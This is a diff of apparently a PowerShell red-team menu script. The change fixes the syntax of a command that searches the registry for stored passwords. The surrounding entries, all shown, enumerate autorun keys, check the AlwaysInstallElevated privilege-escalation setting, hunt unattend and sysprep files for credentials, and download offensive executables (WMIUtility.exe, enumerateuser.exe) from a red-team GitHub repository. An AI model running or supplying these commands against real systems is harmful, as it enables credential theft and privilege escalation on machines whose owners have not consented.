@@ -672,7 +672,7 @@ while($true){
         '339' {Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl; Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'; Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'; Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'; Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'; Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"; Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"}
         '340' {reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated}
         '341' {reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s}
-        '342' {reg query HKCU /f password /t; REG_SZ /s; reg query HKLM /f password /t REG_SZ /s}
+        '342' {reg query HKCU /f password /t REG_SZ /s; reg query HKLM /f password /t REG_SZ /s}
         '343' {Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}}
         '344' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/WMIUtility" "WMIUtility.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/WMIUtility.exe"}
         '345' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/enumerateuser" "enumerateuser.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/enumerateuser.exe"}
